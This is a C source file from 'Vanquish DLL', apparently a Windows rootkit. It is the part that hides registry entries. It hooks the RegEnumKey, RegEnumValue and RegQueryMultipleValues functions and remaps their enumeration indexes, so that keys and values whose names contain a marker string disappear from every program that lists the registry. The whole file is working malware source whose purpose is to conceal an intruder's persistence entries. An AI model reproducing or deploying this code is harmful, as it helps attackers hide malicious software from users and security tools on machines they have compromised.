/******************************************************************************\

	Vanquish DLL HideReg - Copyright (c)2003 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "vHideReg.h"
#include "..\Utils.h"

LPCSTR OVERFLOW_AVOIDEDA = "Lucky! Lucky! By retrying I managed to avoid overflowing the Indexor";
LPCSTR OVERFLOW_DETECTEDA = "Gee! Overflowed the Indexor! Hidden registry values may show up...";
LPCSTR INDEXKEY_OVERFLOWA = "Oops! Overflowed dwIndexKEY! Some keys will not show up...";
LPCSTR INDEXVAL_OVERFLOWA = "Oops! Overflowed dwIndexVAL! Some values will not show up...";

DECLARE_HIDEREG

//THE Registry Key Indexor (rki)
//concurrent open handles for one process
const DWORD MAX_REGENUMKEY = 32;

//max subkeys
const DWORD MAX_REGIDX_KEY = 8192;

//max values
const DWORD MAX_REGIDX_VAL = 1024;

//time in msec after wich a handle is considered invalid
const DWORD RKI_TIMEOUT = 240;

//number of tries before declaring rki overflow
const DWORD RKI_RETRY_NUM = 5;

//time to wait between retries in msec
const DWORD RKI_RETRY_TIME = 60;

struct _RegKeyIndirection {
	HKEY hKey;
	DWORD dwOverflow;
	DWORD dwTime;
	DWORD dwIndexKey[MAX_REGIDX_KEY];
	DWORD dwIndexVal[MAX_REGIDX_VAL];
};
typedef struct _RegKeyIndirection RegKeyIndirection;

RegKeyIndirection rkiInd[MAX_REGENUMKEY + 1];

void rkiReplaceIndexKey(HKEY hKey, LPDWORD lpdwIdx);
void rkiReplaceIndexVal(HKEY hKey, LPDWORD lpdwIdx);
int IsInvalid(DWORD i, DWORD dwCurTime);
void rkiCloseHandle(HKEY hKey);
DWORD rkiFindByHandle(HKEY hKey);

void rkiReplaceIndexKey(HKEY hKey, LPDWORD lpdwIdx)
{
	DWORD x, y;

	if (!lpdwIdx) return;
	if (IsBadReadPtr(lpdwIdx, sizeof(DWORD))) return;
	if (IsBadWritePtr(lpdwIdx, sizeof(DWORD))) return;

	x = rkiFindByHandle(hKey);
	if (rkiInd[x].dwOverflow == 0)
	{
		y = *lpdwIdx;
		*lpdwIdx = (rkiInd[x].dwIndexKey)[y];
	}
}

void rkiReplaceIndexVal(HKEY hKey, LPDWORD lpdwIdx)
{
	DWORD x, y;

	if (!lpdwIdx) return;
	if (IsBadReadPtr(lpdwIdx, sizeof(DWORD))) return;
	if (IsBadWritePtr(lpdwIdx, sizeof(DWORD))) return;

	x = rkiFindByHandle(hKey);
	if (rkiInd[x].dwOverflow == 0)
	{
		y = *lpdwIdx;
		*lpdwIdx = (rkiInd[x].dwIndexVal)[y];
	}
}

int IsInvalid(DWORD i, DWORD dwCurTime)
{
	VBEGIN
	if (rkiInd[i].hKey == 0) return 1;

	DWORD dwElapsed;

	if (dwCurTime < rkiInd[i].dwTime)
		dwElapsed = 0xffffffff - rkiInd[i].dwTime + dwCurTime; //in the middle of the night...
	else
		dwElapsed = dwCurTime - rkiInd[i].dwTime;

	if (dwElapsed >= RKI_TIMEOUT) return 1;

	VEND
	return 0;
}

void rkiCloseHandle(HKEY hKey)
{
	VBEGIN
	DWORD i, j;

	for (i = 0; i < MAX_REGENUMKEY; i++)
		if (rkiInd[i].hKey == hKey)
		{
			rkiInd[i].hKey = 0;
			rkiInd[i].dwOverflow = 0;
			for (j = 0; j < MAX_REGIDX_KEY; j++)
				rkiInd[i].dwIndexKey[j] = MAX_REGIDX_KEY;
			for (j = 0; j < MAX_REGIDX_VAL; j++)
				rkiInd[i].dwIndexVal[j] = MAX_REGIDX_VAL;
		}
	VEND
}

void rkiClearIndexor()
{
	VBEGIN
	DWORD i, j;

	for (i = 0; i < MAX_REGENUMKEY; i++)
	{
		rkiInd[i].hKey = 0;
		rkiInd[i].dwOverflow = 0;
		for (j = 0; j < MAX_REGIDX_KEY; j++)
			rkiInd[i].dwIndexKey[j] = MAX_REGIDX_KEY;
		for (j = 0; j < MAX_REGIDX_VAL; j++)
			rkiInd[i].dwIndexVal[j] = MAX_REGIDX_VAL;
	}
	//in case we overflow indexor, this is the default handler
	rkiInd[MAX_REGENUMKEY].hKey = 0;
	rkiInd[MAX_REGENUMKEY].dwOverflow = 1;
	for (j = 0; j < MAX_REGIDX_KEY; j++)
		rkiInd[MAX_REGENUMKEY].dwIndexKey[j] = j;
	for (j = 0; j < MAX_REGIDX_VAL; j++)
		rkiInd[MAX_REGENUMKEY].dwIndexVal[j] = j;
	VEND
}


DWORD rkiFindByHandle(HKEY hKey)
{
	DWORD ok, i, j, nw = MAX_REGENUMKEY, sz, dwCurTime, rty;

	VBEGIN
	LONG retValue;
	char buff[2 * (MAX_PATH + 2)];
	LPWSTR lpName;

	lpName = (LPWSTR)buff;

	//find index in rki database
	for (i = 0; i < MAX_REGENUMKEY; i++)
		if (rkiInd[i].hKey == hKey)
			return i;

	//not found!!! we must create!!!
	nw = 0;
	rty = RKI_RETRY_NUM;

ffree_again:
	//find free slot
	dwCurTime = GetTickCount();
	ok = 0;
	for (i = 0; i < MAX_REGENUMKEY; i++)
		if (IsInvalid(i, dwCurTime) == 1)
		{
			ok = 1;
			break;
		}
	rty--;
	if ((!ok) && (rty > 0))
	{
		Vanquish_Dump(OVERFLOW_AVOIDEDA);
		Sleep(RKI_RETRY_TIME);
		goto ffree_again;
	}

	//no free slot; default NO-ERROR handling
	if (!ok)
	{
		Vanquish_Dump(OVERFLOW_DETECTEDA);
		rkiInd[nw].dwOverflow = 1;
		return MAX_REGENUMKEY;
	}

	//found free slot
	nw = i;
	rkiInd[nw].hKey = hKey;
	rkiInd[nw].dwOverflow = 0;
	rkiInd[nw].dwTime = GetTickCount();

	//parse key
	ok = 0;
	for (i = 0; i < MAX_REGIDX_KEY; i++)
	{
		RESTORE_API(RegEnumKeyW);

		//equivalent to: retValue = RegEnumKeyW(hKey, i, lpName, MAX_PATH + 1);
		SIMPLE_ARG(MAX_PATH + 1);
		SIMPLE_ARG(lpName);
		SIMPLE_ARG(i);
		SIMPLE_ARG(hKey);
		SIMPLE_CALL(RegEnumKeyW);

		REPLACE_API(RegEnumKeyW);
		if (retValue != ERROR_SUCCESS)
		{
			ok = 1;
			break;
		}

		if (posw0(lpName) == 0xffffffff)
			rkiInd[nw].dwIndexKey[i] = i;
		else
			rkiInd[nw].dwIndexKey[i] = MAX_REGIDX_KEY;
	}

	if (!ok)
	{
		Vanquish_Dump(INDEXKEY_OVERFLOWA);
		rkiInd[nw].dwOverflow = 1;
		return MAX_REGENUMKEY;
	}

	sz = i;
	//for NOCRASH reasons we do this
	for (i = sz; i < MAX_REGIDX_KEY; i++)
		rkiInd[nw].dwIndexKey[i] = MAX_REGIDX_KEY;

	//do indexing
	j = 0;
	ok = 1;
	for (i = 0; (i < sz) && (j < MAX_REGIDX_KEY); i++)
	{
		while (rkiInd[nw].dwIndexKey[j] == MAX_REGIDX_KEY)
		{
			j++;
			if (j >= sz)
			{
				ok = 0;
				break;
			}
		}

		if (!ok)
		{
			rkiInd[nw].dwIndexKey[i] = MAX_REGIDX_KEY;
			break;
		}

		rkiInd[nw].dwIndexKey[i] = rkiInd[nw].dwIndexKey[j];
		j++;
	}

	sz = i + 1;
	//for NOCRASH reasons we do this
	for (i = sz; i < MAX_REGIDX_KEY; i++)
		rkiInd[nw].dwIndexKey[i] = MAX_REGIDX_KEY;

	//parse values
	ok = 0;
	for (i = 0; i < MAX_REGIDX_VAL; i++)
	{
		sz = MAX_PATH + 1;
		RESTORE_API(RegEnumValueW);

		//equivalent to: retValue = RegEnumValueW(hKey, i, lpName, &sz, NULL, NULL, NULL, NULL);
		SIMPLE_ARG(NULL);
		SIMPLE_ARG(NULL);
		SIMPLE_ARG(NULL);
		SIMPLE_ARG(NULL);
		SIMPLE_PARG(sz);
		SIMPLE_ARG(lpName);
		SIMPLE_ARG(i);
		SIMPLE_ARG(hKey);
		SIMPLE_CALL(RegEnumValueW);

		REPLACE_API(RegEnumValueW);
		if (retValue != ERROR_SUCCESS)
		{
			ok = 1;
			break;
		}

		if (posw0(lpName) == 0xffffffff)
			rkiInd[nw].dwIndexVal[i] = i;
		else
			rkiInd[nw].dwIndexVal[i] = MAX_REGIDX_VAL;
	}

	if (!ok)
	{
		Vanquish_Dump(INDEXVAL_OVERFLOWA);
		rkiInd[nw].dwOverflow = 1;
		return MAX_REGENUMKEY;
	}

	sz = i;
	//for NOCRASH reasons we do this
	for (i = sz; i < MAX_REGIDX_VAL; i++)
		rkiInd[nw].dwIndexVal[i] = MAX_REGIDX_VAL;

	//do indexing
	j = 0;
	ok = 1;
	for (i = 0; (i < sz) && (j < MAX_REGIDX_VAL); i++)
	{
		while (rkiInd[nw].dwIndexVal[j] == MAX_REGIDX_VAL)
		{
			j++;
			if (j >= sz)
			{
				ok = 0;
				break;
			}
		}

		if (!ok)
		{
			rkiInd[nw].dwIndexVal[i] = MAX_REGIDX_VAL;
			break;
		}

		rkiInd[nw].dwIndexVal[i] = rkiInd[nw].dwIndexVal[j];
		j++;
	}

	sz = i + 1;
	//for NOCRASH reasons we do this
	for (i = sz; i < MAX_REGIDX_VAL; i++)
		rkiInd[nw].dwIndexVal[i] = MAX_REGIDX_VAL;

	VEND
	return nw;
}

NEWAPI
LONG
APIENTRY
VRegCloseKey(
	HKEY hKey
	)
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	VBEGIN

	rkiCloseHandle(hKey);

	RESTORE_API(RegCloseKey);
	OLDCALL(RegCloseKey, 1);
	REPLACE_API(RegCloseKey);

	VEND
	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumKeyW(
    HKEY hKey,
    DWORD dwIndex,
    LPWSTR lpName,
    DWORD cbName
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	VBEGIN
	rkiReplaceIndexKey(hKey, &dwIndex);

	//api thing
	RESTORE_API(RegEnumKeyW);
	OLDCALL(RegEnumKeyW, 4);
	REPLACE_API(RegEnumKeyW);

	VEND
	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumKeyA(
    HKEY hKey,
    DWORD dwIndex,
    LPSTR lpName,
    DWORD cbName
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	VBEGIN
	rkiReplaceIndexKey(hKey, &dwIndex);

	//api thing
	RESTORE_API(RegEnumKeyA);
	OLDCALL(RegEnumKeyA, 4);
	REPLACE_API(RegEnumKeyA);

	VEND
	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumKeyExW(
    HKEY hKey,
    DWORD dwIndex,
    LPWSTR lpName,
    LPDWORD lpcbName,
    LPDWORD lpReserved,
    LPWSTR lpClass,
    LPDWORD lpcbClass,
    PFILETIME lpftLastWriteTime
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	VBEGIN
	rkiReplaceIndexKey(hKey, &dwIndex);

	//api thing
	RESTORE_API(RegEnumKeyExW);
	OLDCALL(RegEnumKeyExW, 8);
	REPLACE_API(RegEnumKeyExW);

	VEND
	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumKeyExA(
    HKEY hKey,
    DWORD dwIndex,
    LPSTR lpName,
    LPDWORD lpcbName,
    LPDWORD lpReserved,
    LPSTR lpClass,
    LPDWORD lpcbClass,
    PFILETIME lpftLastWriteTime
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	VBEGIN
	rkiReplaceIndexKey(hKey, &dwIndex);

	//api thing
	RESTORE_API(RegEnumKeyExA);
	OLDCALL(RegEnumKeyExA, 8);
	REPLACE_API(RegEnumKeyExA);

	VEND
	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumValueW(
    HKEY hKey,
    DWORD dwIndexVal,
    LPWSTR lpValueName,
    LPDWORD lpcbValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	VBEGIN
	rkiReplaceIndexVal(hKey, &dwIndexVal);

	//do the api thing
	RESTORE_API(RegEnumValueW);
	OLDCALL(RegEnumValueW, 8);
	REPLACE_API(RegEnumValueW);

	VEND
	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumValueA(
    HKEY hKey,
    DWORD dwIndexVal,
    LPSTR lpValueName,
    LPDWORD lpcbValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	VBEGIN
	rkiReplaceIndexVal(hKey, &dwIndexVal);

	//do the api thing
	RESTORE_API(RegEnumValueA);
	OLDCALL(RegEnumValueA, 8);
	REPLACE_API(RegEnumValueA);

	VEND
	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegQueryMultipleValuesW(
    HKEY hKey,
    PVALENTW val_list,
    DWORD num_vals,
    LPWSTR lpValueBuf,
    LPDWORD ldwTotsize
    )
{
/****************EXPERIMENTAL******************/
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	VBEGIN
	//this is simpler! no rki database is needed for this!
	DWORD i;

	Vanquish_Dump2Log("*** Finally somebody invoked RegQueryMultipleValuesW");

	if (val_list)
		for (i = 0; i < num_vals; i++)
			if (posw0(val_list[i].ve_valuename) != 0xffffffff)
				return ERROR_CANTREAD;

	//api processing
	RESTORE_API(RegQueryMultipleValuesW);
	OLDCALL(RegQueryMultipleValuesW, 5);
	REPLACE_API(RegQueryMultipleValuesW);

	VEND
	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegQueryMultipleValuesA (
    HKEY hKey,
    PVALENTA val_list,
    DWORD num_vals,
    LPSTR lpValueBuf,
    LPDWORD ldwTotsize
    )
{
/****************EXPERIMENTAL******************/
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	VBEGIN
	//this is simpler! no rki database is needed for this!
	DWORD i;

	Vanquish_Dump2Log("*** Finally somebody invoked RegQueryMultipleValuesA");

	if (val_list)
		for (i = 0; i < num_vals; i++)
			if (pos0(val_list[i].ve_valuename) != 0xffffffff)
				return ERROR_CANTREAD;

	//api processing
	RESTORE_API(RegQueryMultipleValuesA);
	OLDCALL(RegQueryMultipleValuesA, 5);
	REPLACE_API(RegQueryMultipleValuesA);

	VEND
	return retValue;
}